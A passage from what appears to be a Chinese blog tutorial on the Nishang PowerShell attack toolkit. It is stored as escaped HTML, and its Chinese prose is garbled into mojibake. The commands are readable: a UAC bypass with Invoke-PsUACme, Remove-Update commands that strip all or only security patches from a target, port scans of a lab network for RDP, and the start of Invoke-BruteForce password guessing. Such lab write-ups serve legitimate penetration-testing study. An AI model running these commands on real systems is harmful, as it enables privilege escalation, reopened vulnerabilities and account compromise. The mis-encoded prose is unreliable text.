&lt;p&gt;åœ¨ Windows 7 ä¸Šï¼Œåœ¨å¼€å¯å’Œå…³é—­ä¸­é—´æ–°å¼•å…¥äº†ä¸¤ä¸ª UAC çº§åˆ«ï¼Œéƒ½æ˜¯åœ¨æ›´æ”¹ Windows è®¾ç½®æ—¶ä¸é€šçŸ¥ï¼ˆå®é™…ä¸Šå°±æ˜¯åŠ äº†ä¸€äº› UAC ææƒçš„ç™½åå•ï¼‰ã€‚åªæ˜¯ä¸€ä¸ªä¼šè¿›å…¥â€œé»‘å±â€çŠ¶æ€ï¼Œå¦ä¸€ä¸ªä¸ä¼šè¿›å…¥æ­¤çŠ¶æ€ã€‚ä»è¡¨ç°ä¸Šçœ‹è¿™ä¸¤ä¸ªåªæ˜¯é»‘å±ä¸ä¸é»‘å±ï¼Œä½†ä»å®‰å…¨æ€§ä¸Šè®²é»‘å±çš„å®‰å…¨æ€§ä¼šé«˜å¾ˆå¤šã€‚UAC é€šçŸ¥æ—¶è¿›å…¥çš„é»‘å±çŠ¶æ€åœ¨ Windows ä¸­ç§°ä¹‹ä¸ºâ€œå®‰å…¨æ¡Œé¢â€ï¼Œè¿™æ—¶æ•´ä¸ªæ¡Œé¢è¿›å…¥äº† SYSTEM è´¦æˆ·ï¼ŒåŸç”¨æˆ·è´¦æˆ·ä¸‹çš„æ‰€æœ‰ç¨‹åºéƒ½æ— æ³•å¾—çŸ¥æ­¤æ—¶ UAC å¼¹çª—çš„æƒ…å†µï¼Œä¹Ÿæ— æ³•é€šè¿‡æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œæ¥è·³è¿‡è¿™ä¸ª UAC æ¡†ã€‚è€Œä¸é»‘å±æ—¶ï¼Œä¸ä¼šåˆ‡æ¢åˆ°æ–°çš„æ¡Œé¢ç¯å¢ƒï¼ŒåŸæœ‰ç¨‹åºä¾ç„¶å¯ä»¥è·å¾—æ­¤ UAC å¼¹çª—çš„ä¸€äº›ä¿¡æ¯ï¼Œè¿™å¾ˆä¸å®‰å…¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä½†æ˜¯&lt;/strong&gt;ï¼æ— è®ºæ˜¯ Windows Vista è¿˜æ˜¯ Windows 7ï¼Œä¸€æ—¦ä½ å°† UAC è®¾ç½®æ‹–åˆ°æœ€åº•ï¼Œé‚£ä¹ˆæ­¤æ—¶ UAC å°†å½»åº•å…³é—­ã€‚å¦‚æœä½ æ˜¯ç®¡ç†å‘˜è´¦æˆ·ï¼Œé‚£ä¹ˆè¿è¡Œçš„ç¨‹åºéƒ½å°†ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;ä» Windows 8 å¼€å§‹åˆ°ç°åœ¨çš„ Windows 10ï¼Œè™½ç„¶ä¾ç„¶æ˜¯ä¸Šé¢å››ä¸ªè®¾ç½®ï¼Œä½†æ‹–åˆ°æœ€åº•çš„â€œä»ä¸é€šçŸ¥â€æ—¶ï¼ŒUAC ä¾ç„¶æ˜¯å¼€å¯çš„çŠ¶æ€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·æ­£å¸¸å¯åŠ¨çš„è¿›ç¨‹ä¾ç„¶æ˜¯æ ‡å‡†æƒé™ï¼Œè¦è·å¾—ç®¡ç†å‘˜æƒé™æå‡ä¾ç„¶éœ€è¦é‡å¯æ•´ä¸ªè¿›ç¨‹ã€‚è¿™ä¸ªå®‰å…¨æ€§é™åˆ¶æ˜¯å¾ˆé‡è¦çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç‰¹åˆ«è¯´æ˜&lt;/strong&gt;ï¼å®é™…ä¸Š UAC æ‹–åˆ°æœ€é¡¶éƒ¨ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰ UAC é€šçŸ¥éƒ½æ˜¾ç¤º UAC æç¤ºçª—å£æ‰æ˜¯çœŸçš„åœ¨åˆ©ç”¨ UAC ä¿æŠ¤ä½ çš„ç”µè„‘ã€‚å› ä¸º Windows 7 å¼€å§‹æ–°å¢çš„ä¸¤ä¸ªä¸­é—´çº§åˆ«éƒ½æ˜¯åœ¨éƒ¨åˆ†æƒ…å†µä¸‹é™é»˜ææƒï¼Œè€Œè¿™ä¸¤ç§çº§åˆ«å› ä¸ºå¯ä»¥é™é»˜ææƒï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥å¾ˆå®¹æ˜“è¢«ç¨‹åºç»•è¿‡ã€‚å¾®è½¯è®¤ä¸ºç»•è¿‡ UAC å¼¹çª—ä¸æ˜¯æ¼æ´ï¼Œå› ä¸ºè¿™æ˜¯ç”¨æˆ·è‡ªå·±çš„é€‰æ‹©â€”â€”å¦‚æœç”¨æˆ·é€‰æ‹©å…¨éƒ¨é€šçŸ¥æ˜¯ä¸ä¼šç»•è¿‡çš„ï¼Œç”¨æˆ·é€‰æ‹©äº†é»˜è®¤å€¼ï¼Œäºæ˜¯æ‰å¯ä»¥ç»•è¿‡ã€‚æ‰€ä»¥è¿™é‡Œæ¨èå¤§å®¶ä½¿ç”¨ UAC çš„æœ€é«˜æ¡£ï¼Œä¹Ÿå°±æ˜¯å…¨éƒ¨ææƒéƒ½é€šçŸ¥ï¼Œè¿™å¯ä»¥è®©å¤§å¤šæ•°ç»•è¿‡ UAC çš„æ–¹æ³•å¤±æ•ˆã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Nishangä¸­ä¸»è¦æ˜¯åˆ©ç”¨&lt;code&gt;Invoke-PsUACme&lt;/code&gt;è„šæœ¬è¿›è¡Œåˆ©ç”¨çš„ï¼Œè€Œè¿™ä¸ªè„šæœ¬æ˜¯åŸºäº&lt;code&gt;UACME&lt;/code&gt;é¡¹ç›®è¿›è¡Œç¼–å†™çš„ï¼Œå…·ä½“åˆ©ç”¨è¿‡ç¨‹å¯ä»¥çœ‹ä¸‹ï¼šhttp://www.fuzzysecurity.com/tutorials/27.html&lt;/p&gt;
&lt;p&gt;ç”±äºWindows 10ä¼šæä¸æ”¯æŒ/extracté€‰é¡¹ï¼Œæµ‹è¯•ç¯å¢ƒå°±æ¢åˆ°Windows 7è¿›è¡Œæµ‹è¯•ï¼Œæˆ‘ä»¬åœ¨Windows 7ä¸Šæ‰§è¡Œ&lt;code&gt;regedit&lt;/code&gt;æ˜¯ä¼šè¢«uacæç¤ºçš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc92n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;regedit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Access&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;denied&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨Nishangé‡Œé¢çš„è„šæœ¬&lt;code&gt;Invoke-PsUACme&lt;/code&gt;è¿›è¡Œbypassï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nishang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Escalation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-PsUACme&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;#åˆ©ç”¨å¤±è´¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nishang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Escalation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-PsUACme&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;oobe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;#æˆåŠŸåˆ©ç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//21.png&#34; alt=&#34;21&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;åˆ é™¤è¡¥ä¸&#34;&gt;åˆ é™¤è¡¥ä¸&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªè„šæœ¬å¯ä»¥å¸®åŠ©åˆ é™¤ç³»ç»Ÿè¡¥ä¸ï¼Œè¡¥ä¸å¯ä»¥ç”¨æ¥ä¿®å¤ç³»ç»Ÿæ¼æ´ç­‰ä¸€ç³»åˆ—æ¼æ´é—®é¢˜ï¼Œå¦‚æœåˆ é™¤è¡¥ä¸å°±å¯èƒ½é€ æˆç³»ç»Ÿæ¼æ´çš„å†æ¬¡åˆ©ç”¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Remove-Update All ç§»é™¤ç›®æ ‡æœºå™¨ä¸Šçš„æ‰€æœ‰è¡¥ä¸
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Remove-Update Security ç§»é™¤ç›®æ ‡æœºå™¨ä¸Šæ‰€æœ‰å®‰å…¨è¡¥ä¸
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Remove-Update KB2761226 ç§»é™¤æŒ‡å®šç¼–å·çš„è¡¥ä¸
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…¶å®è¿™ä¸ªæ„Ÿè§‰ç”¨æˆ·ä¸æ˜¯å¾ˆå¤§å§ï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šé€šè¿‡æ£€æŸ¥æ²¡æœ‰æ‰“è¡¥ä¸ç„¶åè¿›è¡Œææƒåˆ©ç”¨ï¼Œè¿™ä¸ªä¼°è®¡ä¼šåœ¨åé—¨ä¸Šé¢ä¼šç”¨å¤„å¤§ä¸€ç‚¹,ä¸è¿‡åˆ é™¤è¡¥ä¸è¿™ä¸ªåŠŸèƒ½è¿˜æ˜¯æ¯”è¾ƒæ–°é¢–çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å…¶ä»–åŠŸèƒ½&#34;&gt;å…¶ä»–åŠŸèƒ½&lt;/h2&gt;
&lt;h3 id=&#34;ç«¯å£æ‰«æ&#34;&gt;ç«¯å£æ‰«æ&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Invoke-PortScan&lt;/code&gt;å¯¹ç›®æ ‡æœºå™¨ç¯å¢ƒä¸­çš„å…¶ä»–ä¸»æœºå’Œç«¯å£è¿›è¡Œæšä¸¾ç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-StartAddress å¼€å§‹çš„IPåœ°å€
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-EndAddress ç»“æŸçš„IPåœ°å€
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-ResolveHost æ˜¯å¦è§£æä¸»æœºå
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-ScanPortè¦ä¸è¦è¿›è¡Œç«¯å£æ‰«æ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Port è¦æ‰«æçš„ç«¯å£ï¼ˆé»˜è®¤å¾ˆå¤šï¼Œçœ‹ä¸Šå›¾ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-TimeOut è¶…æ—¶æ—¶é—´
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ¬åœ°æµ‹è¯•å¯¹172.16.0.100-172.16.0.150è¿›è¡Œæ‰«æï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc92n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-PortScan&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-StartA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-EndAddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;150&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ResolveHost&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;IPAddress&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;HostName&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;Ports&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;---------&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt;                 &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;102&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;MACBOOKPRO-ABE9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;105&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;WIN-xxx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰«æå¼€æ”¾3389ç«¯å£çš„æœºå™¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc92n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-PortScan&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-StartA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-EndAddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;150&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ResolveHost&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ScanPort&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3389&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;IPAddress&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;HostName&lt;/span&gt;                 &lt;span class=&#34;n&#34;&gt;Ports&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;---------&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt;                 &lt;span class=&#34;p&#34;&gt;-----&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;102&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;MACBOOKPRO-ABE9&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;105&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;WIN-xxx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt;         &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;3389&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt;              &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;3389&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å¼±å£ä»¤çˆ†ç ´&#34;&gt;å¼±å£ä»¤çˆ†ç ´&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨çš„è„šæœ¬æ˜¯&lt;code&gt;Invoke-BruteForce&lt;/code&gt;,ä¸‹é¢æ˜¯å‘½ä»¤è¯¦è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ComputerName ç”¨äºæŒ‡å®šå¯¹åº”æœåŠ¡çš„è®¡ç®—æœºå
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UserList ç”¨æˆ·åå­—å…¸
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PasswordList å¯†ç å­—å…¸
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service æœåŠ¡ç±»å‹ï¼ˆæ³¨æ„é»˜è®¤ä¸ºï¼šSQLï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;StopOnSuccess æˆåŠŸæ‰¾åˆ°ä¸€ä¸ªä¹‹åå°±åœæ­¢æ‰§è¡Œ
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç½‘ä¸Šå’Œä¹¦ä¸­å†™çš„æ¯”è¾ƒæ¨¡ç³Šï¼Œæˆ‘ä»¬çœ‹ä¸‹è„šæœ¬çš„ä¾‹å­æ¥å®é™…æ“ä½œä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SYNOPSIS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Nishang&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;which&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;performs&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Brute-Force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Attack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;against&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
